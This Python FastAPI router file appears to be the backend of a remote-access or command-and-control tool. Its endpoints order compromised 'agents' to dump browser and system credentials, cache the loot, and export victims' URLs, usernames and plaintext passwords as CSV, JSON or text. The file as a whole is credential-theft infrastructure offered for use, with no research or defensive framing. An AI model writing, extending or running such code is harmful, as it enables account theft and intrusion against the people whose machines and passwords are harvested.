from fastapi import APIRouter, HTTPException, Query
from typing import List, Optional
import logging

logger = logging.getLogger(__name__)
router = APIRouter(prefix="/api/credentials", tags=["credentials"])


@router.post("/extract/browser/{agent_id}")
async def extract_browser_credentials(agent_id: str):
    """Extract browser credentials from agent"""
    from app.agent_manager import agent_manager

    try:
        # Queue the command
        await agent_manager.queue_command(
            agent_id,
            {"credentials_browser": None}
        )

        # Wait for response
        result = await agent_manager.wait_for_response(agent_id, timeout=30)

        return {
            "status": "success",
            "agent_id": agent_id,
            "type": "browser_credentials",
            "data": result.get("output", ""),
            "timestamp": result.get("timestamp")
        }
    except Exception as e:
        logger.error(f"Browser credential extraction failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/extract/system/{agent_id}")
async def extract_system_credentials(agent_id: str):
    """Extract system credentials from agent"""
    from app.agent_manager import agent_manager

    try:
        await agent_manager.queue_command(
            agent_id,
            {"credentials_system": None}
        )

        result = await agent_manager.wait_for_response(agent_id, timeout=30)

        return {
            "status": "success",
            "agent_id": agent_id,
            "type": "system_credentials",
            "data": result.get("output", ""),
            "timestamp": result.get("timestamp")
        }
    except Exception as e:
        logger.error(f"System credential extraction failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/extract/all/{agent_id}")
async def extract_all_credentials(agent_id: str):
    """Extract all credentials (browser + system) from agent"""
    from app.agent_manager import agent_manager

    try:
        await agent_manager.queue_command(
            agent_id,
            {"credentials_all": None}
        )

        result = await agent_manager.wait_for_response(agent_id, timeout=60)

        return {
            "status": "success",
            "agent_id": agent_id,
            "type": "all_credentials",
            "data": result.get("output", ""),
            "timestamp": result.get("timestamp")
        }
    except Exception as e:
        logger.error(f"All credential extraction failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.get("/list/{agent_id}")
async def list_credentials(
    agent_id: str,
    source: Optional[str] = Query(None, description="Filter by source (chrome, firefox, edge, system)")
):
    """List stored credentials from agent"""
    from app.agent_manager import agent_manager

    try:
        # Get the latest credential data from cache
        credentials_cache = getattr(agent_manager, 'credentials_cache', {})

        if agent_id not in credentials_cache:
            raise HTTPException(status_code=404, detail=f"No credentials found for agent {agent_id}")

        creds = credentials_cache[agent_id]

        # Filter by source if specified
        if source:
            creds = [c for c in creds if c.get('source', '').lower() == source.lower()]

        return {
            "status": "success",
            "agent_id": agent_id,
            "total": len(creds),
            "credentials": creds
        }
    except Exception as e:
        logger.error(f"Failed to list credentials: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.get("/stats/{agent_id}")
async def get_credential_stats(agent_id: str):
    """Get credential statistics for agent"""
    from app.agent_manager import agent_manager

    try:
        credentials_cache = getattr(agent_manager, 'credentials_cache', {})

        if agent_id not in credentials_cache:
            return {
                "agent_id": agent_id,
                "total": 0,
                "by_source": {}
            }

        creds = credentials_cache[agent_id]
        stats = {}

        for cred in creds:
            source = cred.get('source', 'unknown')
            stats[source] = stats.get(source, 0) + 1

        return {
            "agent_id": agent_id,
            "total": len(creds),
            "by_source": stats
        }
    except Exception as e:
        logger.error(f"Failed to get credential stats: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/export/{agent_id}")
async def export_credentials(agent_id: str, format: str = Query("csv", pattern="^(csv|json|txt)$")):
    """Export credentials in specified format"""
    from app.agent_manager import agent_manager
    import json
    import csv
    from io import StringIO

    try:
        credentials_cache = getattr(agent_manager, 'credentials_cache', {})

        if agent_id not in credentials_cache:
            raise HTTPException(status_code=404, detail=f"No credentials found for agent {agent_id}")

        creds = credentials_cache[agent_id]

        if format == "json":
            data = json.dumps(creds, indent=2)
            content_type = "application/json"
        elif format == "csv":
            output = StringIO()
            if creds:
                writer = csv.DictWriter(output, fieldnames=creds[0].keys())
                writer.writeheader()
                writer.writerows(creds)
            data = output.getvalue()
            content_type = "text/csv"
        else:  # txt
            lines = ["=== EXPORTED CREDENTIALS ===\n"]
            for cred in creds:
                lines.append(f"Source: {cred.get('source', 'N/A')}")
                lines.append(f"URL: {cred.get('url', 'N/A')}")
                lines.append(f"Username: {cred.get('username', 'N/A')}")
                lines.append(f"Password: {cred.get('password', 'N/A')}")
                lines.append("---\n")
            data = "\n".join(lines)
            content_type = "text/plain"

        return {
            "status": "success",
            "format": format,
            "data": data,
            "count": len(creds)
        }
    except Exception as e:
        logger.error(f"Export failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))
